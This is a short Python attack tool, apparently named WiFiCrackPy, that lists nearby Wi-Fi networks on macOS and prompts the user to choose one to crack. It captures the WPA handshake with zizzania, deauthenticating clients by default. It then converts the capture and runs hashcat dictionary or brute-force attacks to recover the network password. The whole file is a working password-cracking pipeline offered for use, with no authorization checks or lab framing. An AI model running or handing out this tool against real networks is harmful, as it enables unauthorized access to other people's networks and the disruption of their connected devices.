import subprocess, re, argparse
from prettytable import PrettyTable
from tabulate import tabulate
from os.path import expanduser, join
from pyfiglet import Figlet

# Defie paths
airport_path = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'
hashcat_path = join(expanduser('~'), 'hashcat', 'hashcat')
zizzania_path = join(expanduser('~'), 'zizzania', 'src', 'zizzania')

# Parse arguments
parser = argparse.ArgumentParser()
parser.add_argument('-w')
parser.add_argument('-m')
parser.add_argument('-i')
parser.add_argument('-p')
parser.add_argument('-d', action='store_false')
parser.add_argument('-o', action='store_true')
args = parser.parse_args()


def scan_networks():
    print('Scanning for networks...\n')

    # Scan for networks using airport
    scan = subprocess.run([airport_path, '-s'], stdout=subprocess.PIPE)
    scan = scan.stdout.decode('utf-8').split('\n')
    count = len(scan) - 1
    scan = [o.split() for o in scan]

    # Parse scan results and display in a table
    scan_result = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel', 'Security'])
    networks = {}
    for i in range(1, count):
        bssid = re.search('([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})', ' '.join(scan[i])).group(0)
        bindex = scan[i].index(bssid)

        network = {}
        network['ssid'] = ' '.join(scan[i][0:bindex])
        network['bssid'] = bssid
        network['rssi'] = scan[i][bindex + 1]
        network['channel'] = scan[i][bindex + 2].split(',')[0]
        network['security'] = scan[i][bindex + 5].split('(')[0]

        networks[i] = network
        scan_result.add_row([i, network['ssid'], network['bssid'], network['rssi'], network['channel'], network['security']])

    print(scan_result)

    # Ask user to select a network to crack
    x = int(input('\nSelect a network to crack: '))
    capture_network(networks[x]['bssid'], networks[x]['channel'])


def capture_network(bssid, channel):
    # Put the network card in monitor mode and set the channel
    subprocess.run(['sudo', airport_path, '-z'])
    subprocess.run(['sudo', airport_path, '-c' + channel])

    # Determine the network interface
    if args.i is None:
        iface = subprocess.run(['networksetup', '-listallhardwareports'], stdout=subprocess.PIPE)
        iface = iface.stdout.decode('utf-8').split('\n')
        iface = iface[iface.index('Hardware Port: Wi-Fi') + 1].split(': ')[1]
    else:
        iface = args.i

    print('\nInitiating zizzania to capture handshake...\n')

    # Use zizzania to capture the handshake
    subprocess.run([zizzania_path, '-i', iface, '-b', bssid, '-w', 'capture.pcap', '-q'] + ['-n'] * args.d)

    # Convert the capture to hashcat format
    subprocess.run(['hcxpcapngtool', '-o', 'capture.hc22000', 'capture.pcap'], stdout=subprocess.PIPE)

    print('\nHandshake ready for cracking...\n')

    crack_capture()


def crack_capture():
    # Ask user to select a cracking method
    if args.m is None:
        print(tabulate([[1, 'Dictionary'], [2, 'Brute-force'], [3, 'Manual']], headers=['Number', 'Mode']))
        method = int(input('\nSelect an attack mode: '))
    else:
        method = int(args.m)

    # Get the wordlist
    if method == 1 and args.w is None:
        wordlist = input('\nInput a wordlist path: ')
    elif method == 1 and args.w is not None:
        wordlist = args.w

    # Run hashcat against the capture
    if method == 1:
        subprocess.run([hashcat_path, '-m', '22000', 'capture.hc22000', wordlist] + ['-O'] * args.o)
    elif method == 2:
        # Get the brute-force pattern
        if args.p is None:
            pattern = input('\nInput a brute-force pattern: ')
        else:
            pattern = args.p
        subprocess.run([hashcat_path, '-m', '22000', '-a', '3', 'capture.hc22000', pattern] + ['-O'] * args.o)
    else:
        print('\nRun hashcat against: capture.hc22000')


f = Figlet(font='big')
print('\n' + f.renderText('WiFiCrackPy'))

scan_networks()
